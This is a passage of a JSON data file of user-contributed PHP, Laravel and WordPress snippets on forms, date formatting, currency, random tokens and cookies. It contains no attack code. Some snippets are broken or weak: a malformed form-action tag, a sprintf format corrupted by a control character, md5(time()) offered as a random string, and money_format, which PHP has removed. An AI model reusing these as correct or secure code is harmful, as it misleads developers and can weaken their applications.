    "description": "use Illuminate\\Database\\Schema\\Blueprint; use Illuminate\\Support\\Facades\\Schema;  Schema::table('posts', function (Blueprint $table) {     $table->unsignedBigInteger('user_id');      $table->foreign('user_id')->references('id')->on('users'); });\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1200,
    "keyword": null,
    "link": null,
    "title": " form action on same page in php",
    "description": "<form action=\"<php echo $_SERVER['php_shelf'] ?>\" method=\"POST\">   <--   Your inputs here   --!>        </form>     <?php   if(isset($_POST['your input name']){   \t$input = $_POST['input name'];   }      ?>\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1201,
    "keyword": null,
    "link": null,
    "title": " form action php",
    "description": "// Page containing a form: <form action=\"myaction.php\" method=\"post\">  <p>Your name : <input type=\"text\" name=\"name\" /></p>  <input type=\"submit\" value=\"Submit\"> </form>  // myaction.php Hello <?php echo htmlspecialchars($_POST['name']); ?>\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1202,
    "keyword": null,
    "link": null,
    "title": " form post self php",
    "description": "// Here is how to post form data to self or to the same page &  // avoid the PHP_SELF exploits at the same time. <form name=\"my_form\" method=\"post\"   action=\"<?php echo htmlentities($_SERVER['PHP_SELF']); ?>\">  </form>\n<?php if (!empty($_POST)): ?>     Welcome, <?php echo htmlspecialchars($_POST[\"name\"]); ?>!<br>     Your email is <?php echo htmlspecialchars($_POST[\"email\"]); ?>.<br> <?php else: ?>     <form action=\"<?php echo htmlspecialchars($_SERVER[\"PHP_SELF\"]); ?>\" method=\"post\">         Name: <input type=\"text\" name=\"name\"><br>         Email: <input type=\"text\" name=\"email\"><br>         <input type=\"submit\">     </form> <?php endif; ?> \n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1203,
    "keyword": null,
    "link": null,
    "title": " form validation for file type in codeigniter",
    "description": "if (empty($_FILES['userfile']['name'])) {     $this->form_validation->set_rules('userfile', 'Image', 'required'); }\n",
    "reg_date": "2021-10-12T10:14:01.000Z"
  },
  {
    "id": 1204,
    "keyword": null,
    "link": null,
    "title": " form validation in php",
    "description": " <?php // define variables and set to empty values $name = $email = $gender = $comment = $website = \"\";  if ($_SERVER[\"REQUEST_METHOD\"] == \"POST\") {   $name = test_input($_POST[\"name\"]);   $email = test_input($_POST[\"email\"]);      $website = test_input($_POST[\"website\"]);   $comment = test_input($_POST[\"comment\"]);   $gender = test_input($_POST[\"gender\"]); }   //php form data validation function  function test_input($data) {   $data = trim($data);   $data = stripslashes($data);   $data = htmlspecialchars($data);   return $data;   } ?>\n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1205,
    "keyword": null,
    "link": null,
    "title": " form validation nullable laravel",
    "description": "'field' => 'nullable'\n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1206,
    "keyword": null,
    "link": null,
    "title": " format a date sting php",
    "description": "<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n# From a date Object: date_format ( DateTimeInterface $object , string $format )  # From the current time $dateTime = new \\DateTime();  // or pass a string or int ->`DateTime($date_time)` $dateTime->format('y-j-d H:i:s T'); #print ex: 21-2-02 16:00:01 PST  # Or a quick one-liner: date('g:i A m-d-Y', strtotime($date_time)); #print ex: 2:00 PM 02-02-2021\n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1207,
    "keyword": null,
    "link": null,
    "title": " format a number with leading zeros in php",
    "description": "sprintf('\u0006d', '12')\n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1208,
    "keyword": null,
    "link": null,
    "title": " format date in laravel using carbon",
    "description": "Carbon::createFromFormat('Y-m-d H:i:s', $request->date)->format('d-m-Y')\n$formateddate = Carbon::parse($date)->format('M d Y'); \n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1209,
    "keyword": null,
    "link": null,
    "title": " format date in php",
    "description": "To convert the date-time format PHP provides strtotime() and date() function. We change the date format from one format to another.  Change YYYY-MM-DD to DD-MM-YYYY <? php. $currDate = \"2020-04-18\"; $changeDate = date(\"d-m-Y\", strtotime($currDate)); echo \"Changed date format is: \". $changeDate. \" (MM-DD-YYYY)\"; ?>\ndate(\"Y-m-d H:i:s\")\n<?php // Assuming today is March 10th, 2001, 5:16:18 pm, and that we are in the // Mountain Standard Time (MST) Time Zone // $today = date(\"F j, Y, g:i a\");                 // March 10, 2001, 5:16 pm $today = date(\"m.d.y\");                         // 03.10.01 $today = date(\"j, n, Y\");                       // 10, 3, 2001 $today = date(\"Ymd\");                           // 20010310 $today = date('h-i-s, j-m-y, it is w Day');     // 05-16-18, 10-03-01, 1631 1618 6 Satpm01 $today = date('\\i\\t \\i\\s \\t\\h\\e jS \\d\\a\\y.');   // it is the 10th day. $today = date(\"D M j G:i:s T Y\");               // Sat Mar 10 17:16:18 MST 2001 $today = date('H:m:s \\m \\i\\s\\ \\m\\o\\n\\t\\h');     // 17:03:18 m is month $today = date(\"H:i:s\");                         // 17:16:18 $today = date(\"Y-m-d H:i:s\");                   // 2001-03-10 17:16:18 (the MySQL DATETIME format) ?>    /*d\tDay of the month, 2 digits with leading zeros\t01 to 31 D\tA textual representation of a day, three letters\tMon through Sun j\tDay of the month without leading zeros\t1 to 31 l (lowercase 'L')\tA full textual representation of the day of the week\tSunday through Saturday N\tISO-8601 numeric representation of the day of the week (added in PHP 5.1.0)\t1 (for Monday) through 7 (for Sunday) S\tEnglish ordinal suffix for the day of the month, 2 characters\tst, nd, rd or th. Works well with j w\tNumeric representation of the day of the week\t0 (for Sunday) through 6 (for Saturday) z\tThe day of the year (starting from 0)\t0 through 365 Week\t---\t--- W\tISO-8601 week number of year, weeks starting on Monday\tExample: 42 (the 42nd week in the year) Month\t---\t--- F\tA full textual representation of a month, such as January or March\tJanuary through December m\tNumeric representation of a month, with leading zeros\t01 through 12 M\tA short textual representation of a month, three letters\tJan through Dec n\tNumeric representation of a month, without leading zeros\t1 through 12 t\tNumber of days in the given month\t28 through 31 Year\t---\t--- L\tWhether it's a leap year\t1 if it is a leap year, 0 otherwise. o\tISO-8601 week-numbering year. This has the same value as Y, except that if the ISO week number (W) belongs to the previous or next year, that year is used instead. (added in PHP 5.1.0)\tExamples: 1999 or 2003 Y\tA full numeric representation of a year, 4 digits\tExamples: 1999 or 2003 y\tA two digit representation of a year\tExamples: 99 or 03 Time\t---\t--- a\tLowercase Ante meridiem and Post meridiem\tam or pm A\tUppercase Ante meridiem and Post meridiem\tAM or PM B\tSwatch Internet time\t000 through 999 g\t12-hour format of an hour without leading zeros\t1 through 12 G\t24-hour format of an hour without leading zeros\t0 through 23 h\t12-hour format of an hour with leading zeros\t01 through 12 H\t24-hour format of an hour with leading zeros\t00 through 23 i\tMinutes with leading zeros\t00 to 59 s\tSeconds with leading zeros\t00 through 59 u\tMicroseconds (added in PHP 5.2.2). Note that date() will always generate 000000 since it takes an integer parameter, whereas DateTime::format() does support microseconds if DateTime was created with microseconds.\tExample: 654321 v\tMilliseconds (added in PHP 7.0.0). Same note applies as for u.\tExample: 654 Timezone\t---\t--- e\tTimezone identifier (added in PHP 5.1.0)\tExamples: UTC, GMT, Atlantic/Azores I (capital i)\tWhether or not the date is in daylight saving time\t1 if Daylight Saving Time, 0 otherwise. O\tDifference to Greenwich time (GMT) without colon between hours and minutes\tExample: +0200 P\tDifference to Greenwich time (GMT) with colon between hours and minutes (added in PHP 5.1.3)\tExample: +02:00 T\tTimezone abbreviation\tExamples: EST, MDT ... Z\tTimezone offset in seconds. The offset for timezones west of UTC is always negative, and for those east of UTC is always positive.\t-43200 through 50400 Full Date/Time\t---\t--- c\tISO 8601 date (added in PHP 5)\t2004-02-12T15:19:21+00:00 r\t&raquo; RFC 2822 formatted date\tExample: Thu, 21 Dec 2000 16:01:07 +0200 U\tSeconds since the Unix Epoch (January 1 1970 00:00:00 GMT)\tSee also time() */\n<?php   // To change the format of an existing date   $old_date_format = \"20/03/1999\";   $new_data_format = date(\"Y-m-d H:i:s\", strtotime($old_date_format));\n<?php   \t$date = '05/05/2021'; \techo DateTime::createFromFormat(\"d/m/Y\", $date)->format('Y-m-d'); \t//2021-05-05 \n$myDateTime = DateTime::createFromFormat('Y-m-d', $dateString); $newDateString = $myDateTime->format('d-m-Y'); \n",
    "reg_date": "2021-10-12T10:14:02.000Z"
  },
  {
    "id": 1210,
    "keyword": null,
    "link": null,
    "title": " format date laravel timestamp view",
    "description": "date('d-m-Y', strtotime($user->from_date)); /** or **/ date_format($user->from_date,'D M Y')\n{{\\Carbon\\Carbon::createFromFormat('H:i:s',$time)->format('h:i')}}  {{$item->date_seance->format('d/m/Y') }}  {{date('H:i', strtotime($item->start_time)) }}  \ndate('d-m-Y', strtotime($user->from_date)); \n",
    "reg_date": "2021-10-12T10:14:03.000Z"
  },
  {
    "id": 1211,
    "keyword": null,
    "link": null,
    "title": " format money with commas in php",
    "description": "<?php function CurrencyFormat($number) {    $decimalplaces = 2;    $decimalcharacter = '.';    $thousandseparater = ',';    return number_format($number,$decimalplaces,$decimalcharacter,$thousandseparater); } ?>  \n",
    "reg_date": "2021-10-12T10:14:03.000Z"
  },
  {
    "id": 1212,
    "keyword": null,
    "link": null,
    "title": " format php currency",
    "description": "<?php // beware: number_format also rounds  $number = 1234.56;  // english notation (default) $english_format_number = number_format($number); // 1,235  // French notation $nombre_format_francais = number_format($number, 2, ',', ' '); // 1 234,56  $number = 1234.5678;  // english notation without thousands separator $english_format_number = number_format($number, 2, '.', ''); // 1234.57 \n <?php  $number = 1234.56;  // let's print the international format for the en_US locale setlocale(LC_MONETARY, 'en_US'); echo money_format('%i', $number) . \"\\n\"; // USD 1,234.56  // Italian national format with 2 decimals` setlocale(LC_MONETARY, 'it_IT'); echo money_format('%.2n', $number) . \"\\n\"; // Eu 1.234,56  // Using a negative number $number = -1234.5672;  // US national format, using () for negative numbers // and 10 digits for left precision setlocale(LC_MONETARY, 'en_US'); echo money_format('%(#10n', $number) . \"\\n\"; // ($        1,234.57)  // Similar format as above, adding the use of 2 digits of right // precision and '*' as a fill character echo money_format('%=*(#10.2n', $number) . \"\\n\"; // ($********1,234.57)  // Let's justify to the left, with 14 positions of width, 8 digits of // left precision, 2 of right precision, without the grouping character // and using the international format for the de_DE locale. setlocale(LC_MONETARY, 'de_DE'); echo money_format('%=*^-14#8.2i', 1234.56) . \"\\n\"; // Eu 1234,56****  // Let's add some blurb before and after the conversion specification setlocale(LC_MONETARY, 'en_GB'); $fmt = 'The final value is %i (after a 10%% discount)'; echo money_format($fmt, 1234.56) . \"\\n\"; // The final value is  GBP 1,234.56 (after a 10% discount)  ?>  \n",
    "reg_date": "2021-10-12T10:14:03.000Z"
  },
  {
    "id": 1213,
    "keyword": null,
    "link": null,
    "title": " format time laravel",
    "description": "//laravel method 1 {{ $data->created_at->isoFormat('dddd D') }}  //laravel method 2  {!! date('d/M/y', strtotime($data->created_at)) !!}\ndate('d-m-Y', strtotime($user->from_date)); /** or **/ date_format($user->from_date,'D M Y')\n{{\\Carbon\\Carbon::createFromFormat('H:i:s',$time)->format('h:i')}}  {{$item->date_seance->format('d/m/Y') }}  {{date('H:i', strtotime($item->start_time)) }}  \n{{ $post->created_at->diffForHumans() }}   /*   \t//Output   Arya Stuck 14 minutes ago   Post something       Mizan Khan 23 hours ago   Post something   */\n",
    "reg_date": "2021-10-12T10:14:03.000Z"
  },
  {
    "id": 1214,
    "keyword": null,
    "link": null,
    "title": " formdata jquery ajax php",
    "description": "//set your ajax url here //$url =  $(document).on('submit', '#form',  function(e){         e.preventDefault();         $.ajax({             type: 'POST',             url: $url,             data: new FormData(this),             dataType: 'json',             contentType: false,             processData:false,//this is a must             success: function(response){                  //statements on success             }         });     });\n",
    "reg_date": "2021-10-12T10:14:03.000Z"
  },
  {
    "id": 1215,
    "keyword": null,
    "link": null,
    "title": " forreah php",
    "description": "$arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; }\n",
    "reg_date": "2021-10-12T10:14:04.000Z"
  },
  {
    "id": 1216,
    "keyword": null,
    "link": null,
    "title": " fresh laravel",
    "description": "Product::find($id)->forceDelete();\n$flight = Flight::where('number', 'FR 900')->first();  $flight->number = 'FR 456';  $flight->refresh();  $flight->number; // \"FR 900\"\n",
    "reg_date": "2021-10-12T10:14:04.000Z"
  },
  {
    "id": 1217,
    "keyword": null,
    "link": null,
    "title": " fresh migrqte laravel",
    "description": "Try this command it works for me  php artisan migrate:fresh However, be careful! This command will drop all data from your DB:\nphp artisan make:migration create_flights_table\n$ php artisan migrate:fresh  Dropped all tables successfully. Migration table created successfully. Migrating: 2014_10_12_000000_create_users_table Migrated:  2014_10_12_000000_create_users_table Migrating: 2014_10_12_100000_create_password_resets_table Migrated:  2014_10_12_100000_create_password_resets_table \n",
    "reg_date": "2021-10-12T10:14:04.000Z"
  },
  {
    "id": 1218,
    "keyword": null,
    "link": null,
    "title": " from user id to user role wordpress",
    "description": "$user_meta = get_userdata( $user_id );  $user_roles = $user_meta->roles; // array with all the roles the user is part of. \n$wp_user_object = new WP_User($current_user->ID); $wp_user_object->set_role('editor'); \n",
    "reg_date": "2021-10-12T10:14:04.000Z"
  },
  {
    "id": 1219,
    "keyword": null,
    "link": null,
    "title": " fuck php",
    "description": "PHP SUCKS !\n",
    "reg_date": "2021-10-12T10:14:04.000Z"
  },
  {
    "id": 1220,
    "keyword": null,
    "link": null,
    "title": " full url php",
    "description": "$fullURL = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];\n//Get complete URL with http/https and GET parameters $complete_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1221,
    "keyword": null,
    "link": null,
    "title": " function exists",
    "description": " <?php if (function_exists('imap_open')) {     echo \"IMAP functions are available.<br />\\n\"; } else {     echo \"IMAP functions are not available.<br />\\n\"; } ?>  \nif (typeof yourFunctionName == 'function') {    yourFunctionName();  }\nfunction_exists('function_name'); //Will return true if function exists\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1222,
    "keyword": null,
    "link": null,
    "title": " function php",
    "description": "<?php function writeMsg() {     echo \"Hello world!\"; }  writeMsg(); //call the function ?>\nfunction functionName() {     //code to be executed; }\nfunction functionName() {     //code to be executed; } functionName();\n<html>        <head>       <title>Writing PHP Function with Parameters</title>    </head>        <body>           <?php          function addFunction($num1, $num2) {             $sum = $num1 + $num2;             echo \"Sum of the two numbers is : $sum\";          }                    addFunction(10, 20);       ?>           </body> </html>\n#functions  <?php     #function - a block of code that can be repeatedly called      /*     How to format functions     1. Camel Case myFunction()     2.Lower case with underscore my_function()     3. Pascal Cae - MyFunction() usally used with classes     */     function simpleFunction(){         echo 'Hello John';      }     //Run the function like so     simpleFunction();      //function with param     function sayHello($name = \" you out there!\"){         echo \"<br>and<br> Hello $name<br>\";     }     sayHello('John');     sayHello();      //Reurn Value     function addNumbers($num1, $num2){         return $num1 + $num2;      }      echo addNumbers(2,3);       // By Reference       $myNum = 10;       function addFive($num){          $num += 5;      }       function addTen(&$num) {          $num += 10;      }       addFive($myNum);      echo \"<br>Value: $myNum<br>\";       addTen($myNum);      echo \"Value: $myNum<br>\";   ?>\n// Inherit $message $example = function () use ($message) {     var_dump($message); }; $example();\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1223,
    "keyword": null,
    "link": null,
    "title": " function return time ago php",
    "description": "public function convert_time_to_days($date) {        $current_date = date(\"Y-m-d H:m:s\");        $time = array();        $day = floor((strtotime($current_date) - strtotime($date)) / (60 * 60 * 24));          if ($day == 0) {            $hour = floor((strtotime($current_date) - strtotime($date)) / (60 * 60));              if ($hour == 0) {                $minute = floor((strtotime($current_date) - strtotime($date)) / (60));                $time = $minute . __d('course', \"minutes ago\");              } else {                $time = $hour . __d('course', \"hours ago\");            }               } else {            $time = $day . __d('course', \"days ago\");        }               return $time;    } \n<!DOCTYPE html> <html> <body>  <?php  function time_elapsed_string($datetime, $full = false) {     $now = new DateTime;     $ago = new DateTime($datetime);     $diff = $now->diff($ago);      $diff->w = floor($diff->d / 7);     $diff->d -= $diff->w * 7;      $string = array(         'y' => 'year',         'm' => 'month',         'w' => 'week',         'd' => 'day',         'h' => 'hour',         'i' => 'minute',         's' => 'second',     );     foreach ($string as $k => &$v) {         if ($diff->$k) {             $v = $diff->$k . ' ' . $v . ($diff->$k > 1 ? 's' : '');         } else {             unset($string[$k]);         }     }      if (!$full) $string = array_slice($string, 0, 1);     return $string ? implode(', ', $string) . ' ago' : 'just now'; }  echo time_elapsed_string(date(\"Y-m-d H:i:s\", 1621173863)); ?>  </body> </html>      echo time_elapsed_string('2013-05-01 00:22:35'); echo time_elapsed_string('@1367367755'); # timestamp input echo time_elapsed_string('2013-05-01 00:22:35', true);   Output :  4 months ago 4 months ago 4 months, 2 weeks, 3 days, 1 hour, 49 minutes, 15 seconds ago\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1224,
    "keyword": null,
    "link": null,
    "title": " gallery advanced custom fields",
    "description": "<?php  $images = get_field('gallery');  if( $images ): ?>     <ul>         <?php foreach( $images as $image ): ?>             <li>                 <a href=\"<?php echo $image['url']; ?>\">                      <img src=\"<?php echo $image['sizes']['thumbnail']; ?>\" alt=\"<?php echo $image['alt']; ?>\" />                 </a>                 <p><?php echo $image['caption']; ?></p>             </li>         <?php endforeach; ?>     </ul> <?php endif; ?>\n<?php  $images = get_field('gallery'); $size = 'full'; // (thumbnail, medium, large, full or custom size) if( $images ): ?>     <ul>         <?php foreach( $images as $image_id ): ?>             <li>                 <?php echo wp_get_attachment_image( $image_id, $size ); ?>             </li>         <?php endforeach; ?>     </ul> <?php endif; ?>\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1225,
    "keyword": null,
    "link": null,
    "title": " gd extension docker php",
    "description": "FROM php:5.6-apache  RUN docker-php-ext-install mysql mysqli  RUN apt-get update -y && apt-get install -y sendmail libpng-dev  RUN apt-get update && \\     apt-get install -y \\         zlib1g-dev   RUN docker-php-ext-install mbstring  RUN docker-php-ext-install zip  RUN docker-php-ext-install gd \n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1226,
    "keyword": null,
    "link": null,
    "title": " gd library extension not available with this php installation",
    "description": "The GD Graphics Library is for dynamically manipulating images. For Ubuntu   you should install it manually:  1. check your php version : php -v  2. Run one of the command according to your php verison    PHP5: sudo apt-get install php5-gd PHP7.0: sudo apt-get install php7.0-gd PHP7.1: sudo apt-get install php7.1-gd PHP7.2: sudo apt-get install php7.2-gd PHP7.3: sudo apt-get install php7.3-gd PHP7.4: sudo apt-get install php7.4-gd  3. Thats all, you can verify that GD support loaded:  php -i | grep -i gd  Output should be like this:  GD Support => enabled GD headers Version => 2.1.1-dev gd.jpeg_ignore_warning => 0 => 0  4. Restart your apache service : sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1227,
    "keyword": null,
    "link": null,
    "title": " generate autodump laravel",
    "description": "$ composer dump-autoload \n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1228,
    "keyword": null,
    "link": null,
    "title": " generate random string in php",
    "description": "/**  * Generate a random string, using a cryptographically secure   * pseudorandom number generator (random_int)  *  * This function uses type hints now (PHP 7+ only), but it was originally  * written for PHP 5 as well.  *   * For PHP 7, random_int is a PHP core function  * For PHP 5.x, depends on https://github.com/paragonie/random_compat  *   * @param int $length      How many characters do we want?  * @param string $keyspace A string of all possible characters  *                         to select from  * @return string  */ function random_str(     int $length = 64,     string $keyspace = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ' ): string {     if ($length < 1) {         throw new \\RangeException(\"Length must be a positive integer\");     }     $pieces = [];     $max = mb_strlen($keyspace, '8bit') - 1;     for ($i = 0; $i < $length; ++$i) {         $pieces []= $keyspace[random_int(0, $max)];     }     return implode('', $pieces); } \nphpCopy<?php  $Random_str = uniqid();   echo \"Random String:\", $Random_str, \"\\n\"; ?>  \nphpCopy<?php   echo \"Out1: \",substr(md5(time()), 0, 16),\"\\n\";   echo \"Out2: \",substr(sha1(time()), 0, 16),\"\\n\";   echo \"Out3: \",md5(time()),\"\\n\";   echo \"Out4: \",sha1(time()),\"\\n\";   ?> \nphpCopy<?php   function secure_random_string($length) {     $rand_string = '';     for($i = 0; $i < $length; $i++) {         $number = random_int(0, 36);         $character = base_convert($number, 10, 36);         $rand_string .= $character;     }       return $rand_string; }   echo \"Sec_Out_1: \",secure_random_string(10),\"\\n\";   echo  \"Sec_Out_2: \",secure_random_string(10),\"\\n\";   echo  \"Sec_Out_3: \",secure_random_string(10),\"\\n\";   ?> \nphpCopy<?php  $x = 0;  $y = 10; $Strings = '0123456789abcdefghijklmnopqrstuvwxyz'; echo \"Gen_rand_str: \",substr(str_shuffle($Strings), $x, $y), \"\\n\";  $a = 0; $b = 20; $Strings='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; echo \"Gen_My_Pass: \",'hello.'.substr(str_shuffle($Strings), $a, $b).'.World',\"\\n\"; ?> \nphpCopy<?php  echo uniqid('user_'); ?>  \nphpCopy<?php   echo \"Output-1: \",bin2hex(random_bytes(10)),\"\\n\";   echo \"Output-2: \",bin2hex(random_bytes(20)),\"\\n\";   echo \"Output-3: \",bin2hex(random_bytes(24)),\"\\n\";   ?> \nphpCopy<?php function random_str_generator ($len_of_gen_str){     $chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz\";     $var_size = strlen($chars);     echo \"Random string =\";      for( $x = 0; $x < $len_of_gen_str; $x++ ) {           $random_str= $chars[ rand( 0, $var_size - 1 ) ];           echo $random_str;       } echo \"\\n\"; } random_str_generator (8) ?> \n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1229,
    "keyword": null,
    "link": null,
    "title": " generate random unique hex color code using php",
    "description": "echo '#' . substr(str_shuffle('ABCDEF0123456789'), 0, 6);\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1230,
    "keyword": null,
    "link": null,
    "title": " generate token in php",
    "description": "<?php  // Thanks to: https://thisinterestsme.com/generating-random-token-php/  //Generate a random string. $token = openssl_random_pseudo_bytes(16);   //Convert the binary data into hexadecimal representation. $token = bin2hex($token);   //Print it out for example purposes. echo $token;  ?>\n<?php   //Generate a random string. $token = openssl_random_pseudo_bytes(16);   //Convert the binary data into hexadecimal representation. $token = bin2hex($token);   //Print it out for example purposes. echo $token; ?>\n",
    "reg_date": "2021-10-12T10:14:05.000Z"
  },
  {
    "id": 1231,
    "keyword": null,
    "link": null,
    "title": " generate unique random number php",
    "description": "$uniqueCode = md5(uniqid(rand(), true)); echo $uniqueCode;\n<?php $n=range(11,20); shuffle($n); for ($x=0; $x< 10; $x++) { echo $n[$x].' '; } echo \"\\n\" ?>  \n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1232,
    "keyword": null,
    "link": null,
    "title": " generating-random-token-php",
    "description": "<?php   //Generate a random string. $token = openssl_random_pseudo_bytes(16);   //Convert the binary data into hexadecimal representation. $token = bin2hex($token);   //Print it out for example purposes. echo $token; ?>\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1233,
    "keyword": null,
    "link": null,
    "title": " geoip php sample",
    "description": "$ip = $_SERVER['REMOTE_ADDR']; $details = json_decode(file_get_contents(\"http://ipinfo.io/{$ip}/json\")); echo $details->city; // -> \"Mountain View\"\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1234,
    "keyword": null,
    "link": null,
    "title": " getClientOriginalExtension laravel",
    "description": "$extension = Input::file('photo')->getClientOriginalExtension();\n$name = Input::file('photo')->getClientOriginalName();\nif (Input::file('photo')->isValid()) {     // }\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1235,
    "keyword": null,
    "link": null,
    "title": " get 2 days before date in php",
    "description": "$startDate = new DateTime(\"2019-10-27\"); $endDate = new DateTime(\"2020-04-11\");  $difference = $endDate->diff($startDate); echo $difference->format(\"%a\");\n<?php function dateDifference($start_date, $end_date) {     // calulating the difference in timestamps      $diff = strtotime($start_date) - strtotime($end_date);           // 1 day = 24 hours      // 24 * 60 * 60 = 86400 seconds     return ceil(abs($diff / 86400)); }   // start date  $start_date = \"2016-01-02\";   // end date  $end_date = \"2016-01-21\";   // call dateDifference() function to find the number of days between two dates $dateDiff = dateDifference($start_date, $end_date);   echo \"Difference between two dates: \" . $dateDiff . \" Days \"; ?> \ndate('Y/m/d',strtotime(\"-1 days\"));  Or Use DateTime class like this-  $date = new DateTime(); echo $date->modify(\"-1 days\")->format('Y-m-d');\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1236,
    "keyword": null,
    "link": null,
    "title": " get a cookie in php",
    "description": "<?php echo 'Hello ' . htmlspecialchars($_COOKIE[\"name\"]) . '!'; ?>\n",
    "reg_date": "2021-10-12T10:14:06.000Z"
  },
  {
    "id": 1237,
    "keyword": null,
    "link": null,
    "title": " get acf repeater field",
